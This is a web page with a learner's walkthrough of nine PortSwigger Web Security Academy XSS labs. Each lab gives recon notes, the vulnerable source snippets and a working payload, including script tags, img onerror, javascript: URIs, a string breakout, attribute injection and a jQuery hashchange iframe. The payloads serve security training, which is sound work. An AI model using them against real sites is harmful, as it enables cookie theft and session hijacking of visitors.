<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  XSS - APPRENTICE
  #


  tags: Portswigger Web Security Academy Web
  #

[TOC]

  Lab: Reflected XSS into HTML context with nothing encoded:zero:
  #


Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.


  Exp
  #

Payload: <script>alert(123)</script>
:::spoiler Success Screenshot

:::


  Lab: Stored XSS into HTML context with nothing encoded
  #


Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.
Goal:  To solve this lab, submit a comment that calls the alert function when the blog post is viewed.


  Exp
  #

You need to click into one post and comment something that contained script tag.
Payload: <script>alert(123)</script>
:::spoiler Success Screenshot

:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="XSS - APPRENTICE"><meta property="og:description" content="XSS - APPRENTICE # tags: Portswigger Web Security Academy Web # [TOC]
Lab: Reflected XSS into HTML context with nothing encoded:zero: # Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function. Exp # Payload: <script>alert(123)</script> :::spoiler Success Screenshot :::
Lab: Stored XSS into HTML context with nothing encoded # Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Exp # You need to click into one post and comment something that contained script tag. Payload: <script>alert(123)</script> :::spoiler Success Screenshot :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>XSS - APPRENTICE | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>XSS - APPRENTICE</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#lab-reflected-xss-into-html-context-with-nothing-encodedzero>Lab: Reflected XSS into HTML context with nothing encoded:zero:</a><ul><li><a href=#exp>Exp</a></li></ul></li><li><a href=#lab-stored-xss-into-html-context-with-nothing-encoded>Lab: Stored XSS into HTML context with nothing encoded</a><ul><li><a href=#exp-1>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></a><ul><li><a href=#recon>Recon</a></li><li><a href=#exp-2>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exp-3>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</a><ul><li><a href=#recon-2>Recon</a></li><li><a href=#exp-4>Exp</a></li><li><a href=#reference>Reference</a></li></ul></li><li><a href=#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exp-5>Exp</a></li></ul></li><li><a href=#lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exp-6>Exp</a></li></ul></li><li><a href=#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exp---new-payload>Exp - <font color=FF0000>New payload</font></a></li></ul></li><li><a href=#lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-eventfour>Lab: DOM XSS in jQuery selector sink using a hashchange event:four:</a><ul><li><a href=#background---dom-xss-in-jquery><a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>Background - DOM XSS in jQuery</a></a></li><li><a href=#recon-6>Recon</a></li><li><a href=#exp---jquery-locationhash-vulnerability>Exp - <code>jQuery location.hash</code> vulnerability</a></li><li><a href=#reference-1>Reference</a></li></ul></li><li><a href=#reference-2>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=xss---apprentice>XSS - APPRENTICE
<a class=anchor href=#xss---apprentice>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><p>[TOC]</p><h2 id=lab-reflected-xss-into-html-context-with-nothing-encodedzero>Lab: Reflected XSS into HTML context with nothing encoded:zero:
<a class=anchor href=#lab-reflected-xss-into-html-context-with-nothing-encodedzero>#</a></h2><ul><li>Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.</li><li>Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.</li></ul><h3 id=exp>Exp
<a class=anchor href=#exp>#</a></h3><p>Payload: <code>&lt;script>alert(123)&lt;/script></code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/tvfxD4P.png alt>
:::</p><hr><h2 id=lab-stored-xss-into-html-context-with-nothing-encoded>Lab: Stored XSS into HTML context with nothing encoded
<a class=anchor href=#lab-stored-xss-into-html-context-with-nothing-encoded>#</a></h2><ul><li>Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.</li><li>Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed.</li></ul><h3 id=exp-1>Exp
<a class=anchor href=#exp-1>#</a></h3><p>You need to click into one post and comment something that contained script tag.
Payload: <code>&lt;script>alert(123)&lt;/script></code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/aArBCbN.png alt>
:::</p><hr><h2 id=lab-dom-xss-in-documentwrite-sink-using-source-locationsearch>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code>
<a class=anchor href=#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch>#</a></h2><ul><li>Description: This lab contains a <code>DOM-based</code> cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.</li><li>Goal: To solve this lab, perform a cross-site scripting attack that calls the alert function.</li></ul><h3 id=recon>Recon
<a class=anchor href=#recon>#</a></h3><ol><li>Tried in random strings
I tried everything I learned but nothing prompt appeared. But, I noticed something strange using view page source and inspect.
Payload: <code>&lt;script>alert(123)&lt;/script></code>
<img src=https://i.imgur.com/2euiFeA.png alt>
You can see that the normal payload is not working, however, there has another place to inject script tag $\to$ <code>document.write(...)</code>
So, I inspect it in original page
<img src=https://i.imgur.com/NCJUJXj.png alt></li></ol><h3 id=exp-2>Exp
<a class=anchor href=#exp-2>#</a></h3><p>Payload: <code>">&lt;script>alert(123)&lt;/script>"</code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/X801Wgo.png alt>
<img src=https://i.imgur.com/RIGDA9b.png alt>
:::</p><hr><h2 id=lab-dom-xss-in-innerhtml-sink-using-source-locationsearch>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code>
<a class=anchor href=#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch>#</a></h2><ul><li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an <code>innerHTML</code> assignment, which changes the HTML contents of a <code>div</code> element, using data from <code>location.search</code>.</li><li>Goal: To solve this lab, perform a cross-site scripting attack that calls the alert function.</li></ul><h3 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h3><p>:::spoiler Source Code</p><pre tabindex=0><code class=language-javascript! data-lang=javascript!>...
&lt;section class=blog-header&gt;
    &lt;h1&gt;&lt;span&gt;0 search results for &#39;&lt;/span&gt;&lt;span id=&#34;searchMessage&#34;&gt;&lt;/span&gt;&lt;span&gt;&#39;&lt;/span&gt;&lt;/h1&gt;
    &lt;script&gt;
        function doSearchQuery(query) {
            document.getElementById(&#39;searchMessage&#39;).innerHTML = query;
        }
        var query = (new URLSearchParams(window.location.search)).get(&#39;search&#39;);
        if(query) {
            doSearchQuery(query);
        }
    &lt;/script&gt;
    &lt;hr&gt;
&lt;/section&gt;
...
</code></pre><p>:::</p><ol><li><p>Input <code>abc</code> and observe page source
<img src=https://i.imgur.com/sc3QWXN.png alt></p></li><li><p>Input <code>&lt;script>alert(123)&lt;/script></code> and observe page source
<img src=https://i.imgur.com/ZW6WvOn.png alt>
Nothing prompt appeared though it&rsquo;s included in <code>span</code> tag</p></li><li><p>So, how about using <code>img</code> tag to achieve XSS?</p></li></ol><h3 id=exp-3>Exp
<a class=anchor href=#exp-3>#</a></h3><p>Payload: <code>&lt;img src=1 onerror=alert(1)></code>
<img src=https://i.imgur.com/FonVo3L.png alt>
It&rsquo;s rendered successfully.
:::spoiler Success Screenshot
<img src=https://i.imgur.com/fcXrlDu.png alt>
:::</p><hr><h2 id=lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source
<a class=anchor href=#lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source>#</a></h2><ul><li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the <code>jQuery</code> library&rsquo;s <code>$</code> selector function to find an anchor element, and changes its <code>href</code> attribute using data from <code>location.search</code>.</li><li>Goal: To solve this lab, make the &ldquo;back&rdquo; link alert document.cookie.</li></ul><h3 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h3><p>According to the description and our goal, we must find where <code>back</code> is. By using the string search of each page, I found it in <code>feedback</code> sub-page.
:::spoiler Source code</p><pre tabindex=0><code class=language-javascript! data-lang=javascript!>...
&lt;div class=&#34;is-linkback&#34;&gt;
    &lt;a id=&#34;backLink&#34;&gt;Back&lt;/a&gt;
&lt;/div&gt;
&lt;script&gt;
    $(function() {
        $(&#39;#backLink&#39;).attr(&#34;href&#34;, (new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;));
    });
&lt;/script&gt;
...
</code></pre><p>:::
According to the source code, we can inject some malicious path to replace <code>/</code></p><h3 id=exp-4>Exp
<a class=anchor href=#exp-4>#</a></h3><p>Payload: <code>/feedback?returnPath=javascript:alert(document.cookie);</code>
After you modified the URL, then you hit enter and click <code>Back</code> button down the page. Then it should be triggered.
:::spoiler Result
<img src=https://i.imgur.com/Zjd2Jm7.png alt></p><p><img src=https://i.imgur.com/JRpKTAq.png alt>
:::</p><h3 id=reference>Reference
<a class=anchor href=#reference>#</a></h3><p><a href=https://youtu.be/RmyZgpqMfcM>PortSwigger Labs - DOM XSS in jQuery anchor href attribute sink using location.search source</a>
<a href=https://youtu.be/B2E9cEZQQXg>DOM XSS in jQuery anchor href attribute sink using &mldr; (Video solution, Audio)</a>
:::spoiler <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM-based XSS</a></p><blockquote><p>If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery&rsquo;s attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element&rsquo;s href attribute using data from the URL:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>$</span>(<span style=color:#66d9ef>function</span>() {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#backLink&#39;</span>).<span style=color:#a6e22e>attr</span>(<span style=color:#e6db74>&#34;href&#34;</span>,(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URLSearchParams</span>(window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>search</span>)).<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;returnUrl&#39;</span>));
</span></span><span style=display:flex><span>});
</span></span></code></pre></div></blockquote><p>:::</p><hr><h2 id=lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
<a class=anchor href=#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>#</a></h2><ul><li>Description: This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.</li><li>Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.</li></ul><h3 id=recon-3>Recon
<a class=anchor href=#recon-3>#</a></h3><ol><li><p>We have to find where can inject XSS attack
If we input <code>abc</code> in search box, there&rsquo;re 2 place can be injected
<img src=https://i.imgur.com/cjpvpqm.png alt></p></li><li><p>Then how about <code>&lt;script>alert(123)&lt;/script></code>
<img src=https://i.imgur.com/BirS8Eu.png alt>
Seems it&rsquo;s not working here. So, we should find another payload to inject.</p></li><li><p>Try New payload
Payload: <code>'abc</code> $\to$ Seems safe for <code>'</code> character
<img src=https://i.imgur.com/GM2bPJx.png alt></p><hr><p>Payload: <code>//abc</code> $\to$ Seems safe for <code>//</code> character
<img src=https://i.imgur.com/nzd4iF4.png alt></p></li></ol><h3 id=exp-5>Exp
<a class=anchor href=#exp-5>#</a></h3><p>Why we don&rsquo;t inject into 2nd place?
Payload: <code>\\';alert(123);//</code> or <code>';alert(123);//</code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/IOBX0oq.png alt></p><p><img src=https://i.imgur.com/PKUYHuo.png alt>
:::</p><hr><h2 id=lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded
<a class=anchor href=#lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>#</a></h2><ul><li>Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.</li><li>Goal: To solve this lab, submit a comment that calls the <code>alert</code> function when the comment author name is clicked.</li></ul><h3 id=recon-4>Recon
<a class=anchor href=#recon-4>#</a></h3><ol><li><p>Find the place to inject
According to the description, we know that the comment place has a injection place.
Comment: <code>abc</code>
Name: <code>aaa</code>
Email: <code>a@gmail.com</code>
Website: <code>https://test.sbkblog.online</code>
<img src=https://i.imgur.com/6utKpWm.png alt></p></li><li><p>How about script tag input
Comment: <code>&lt;script>alert(123)&lt;/script></code>
<img src=https://i.imgur.com/TWJV4F3.png alt>
Seems not working here</p></li><li><p>How about inject into website place?
Website: <code>https://test.sbkblog.online"&lt;script>alert(123)&lt;/script>//</code>
<img src=https://i.imgur.com/kfP6IeN.png alt>
Still not working here</p></li><li><p><font color=FF0000>According to <strong>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</strong></font>
We know that we can inject XSS in <code>href</code> attribute by using the payload: <code>javascript:alert(1)</code></p></li></ol><h3 id=exp-6>Exp
<a class=anchor href=#exp-6>#</a></h3><p>Website Payload: <code>javascript:alert(1)</code>
<img src=https://i.imgur.com/u6COY4h.png alt></p><p>:::spoiler Success Screenshot
<img src=https://i.imgur.com/Qj21zuC.png alt>
:::</p><hr><h2 id=lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>Lab: Reflected XSS into attribute with angle brackets HTML-encoded
<a class=anchor href=#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>#</a></h2><ul><li>Description: This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.</li><li>Goal: To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.</li></ul><h3 id=recon-5>Recon
<a class=anchor href=#recon-5>#</a></h3><ol><li><p>Find the place to inject
Input: <code>abc</code>
<img src=https://i.imgur.com/RfMiJ1W.png alt>
Seems we have 2 candidates</p></li><li><p>How about script tag
Input: <code>&lt;script>alert(123)&lt;/script></code>
<img src=https://i.imgur.com/mLhHdgh.png alt>
Seems angle brackets are HTML-encoded and not working properly.</p></li><li><p>How about <code>href</code> attribute?
Input: <code>"javascript:alert(123)</code>
<img src=https://i.imgur.com/NNm3USg.png alt>
Still not working for input tag.</p></li></ol><h3 id=exp---new-payload>Exp - <font color=FF0000>New payload</font>
<a class=anchor href=#exp---new-payload>#</a></h3><p>Input: <code>" onmouseover="alert(1)</code>
<img src=https://i.imgur.com/BDO0c0s.png alt></p><p>:::spoiler Success Screenshot
<img src=https://i.imgur.com/jvGdCEE.png alt>
:::</p><hr><h2 id=lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-eventfour>Lab: DOM XSS in jQuery selector sink using a hashchange event:four:
<a class=anchor href=#lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-eventfour>#</a></h2><ul><li>Description: This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery&rsquo;s <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property.</li><li>Goal: To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser.</li></ul><h3 id=background---dom-xss-in-jquery><a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>Background - DOM XSS in jQuery</a>
<a class=anchor href=#background---dom-xss-in-jquery>#</a></h3><p>簡單來說，有些頁面支援<code>jQuery</code>的<code>location.hash</code>功能，也就是在URL的末端添加<code>#XXX</code>，前端會自動scrolling到對應的位置(就是Github那樣)，文章中有提到如果hash是使用者可以控制的，攻擊者可以使用它來將 XSS 向量注入 <code>$()</code> seletor接收器。 較新版本的<code>jQuery</code>已通過阻止使用者在輸入以hash character(#)開頭時將 HTML 注入seletor來修補此特定漏洞。
Payload for example: <code>&lt;iframe src="https://vulnerable-website.com#" onload="this.src+='&lt;img src=1 onerror=alert(1)>'"></code></p><h3 id=recon-6>Recon
<a class=anchor href=#recon-6>#</a></h3><ol><li><p>Find the specific place to inject
<img src=https://i.imgur.com/hYcpZBn.png alt></p></li><li><p>Follow the background reference to create the new payload</p></li></ol><h3 id=exp---jquery-locationhash-vulnerability>Exp - <code>jQuery location.hash</code> vulnerability
<a class=anchor href=#exp---jquery-locationhash-vulnerability>#</a></h3><p>Payload: <code>&lt;iframe src="https://0aab00ee04037bdb802cc6c600230039.web-security-academy.net/#" onload="this.src+='&lt;img src=xxx onerror=print()>'">&lt;/iframe></code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/nOSouuD.png alt>
:::</p><h3 id=reference-1>Reference
<a class=anchor href=#reference-1>#</a></h3><p><a href=https://youtu.be/k4kpc0b8p5U>Lab DOM XSS in jQuery Selector Sink Using a Hash Change Event</a></p><h2 id=reference-2>Reference
<a class=anchor href=#reference-2>#</a></h2><p><a href=https://github.com/frank-leitner/portswigger-websecurity-academy>Burp Suite Security Academy Writeup</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#lab-reflected-xss-into-html-context-with-nothing-encodedzero>Lab: Reflected XSS into HTML context with nothing encoded:zero:</a><ul><li><a href=#exp>Exp</a></li></ul></li><li><a href=#lab-stored-xss-into-html-context-with-nothing-encoded>Lab: Stored XSS into HTML context with nothing encoded</a><ul><li><a href=#exp-1>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></a><ul><li><a href=#recon>Recon</a></li><li><a href=#exp-2>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exp-3>Exp</a></li></ul></li><li><a href=#lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</a><ul><li><a href=#recon-2>Recon</a></li><li><a href=#exp-4>Exp</a></li><li><a href=#reference>Reference</a></li></ul></li><li><a href=#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exp-5>Exp</a></li></ul></li><li><a href=#lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exp-6>Exp</a></li></ul></li><li><a href=#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exp---new-payload>Exp - <font color=FF0000>New payload</font></a></li></ul></li><li><a href=#lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-eventfour>Lab: DOM XSS in jQuery selector sink using a hashchange event:four:</a><ul><li><a href=#background---dom-xss-in-jquery><a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>Background - DOM XSS in jQuery</a></a></li><li><a href=#recon-6>Recon</a></li><li><a href=#exp---jquery-locationhash-vulnerability>Exp - <code>jQuery location.hash</code> vulnerability</a></li><li><a href=#reference-1>Reference</a></li></ul></li><li><a href=#reference-2>Reference</a></li></ul></nav></div></aside></main></body></html>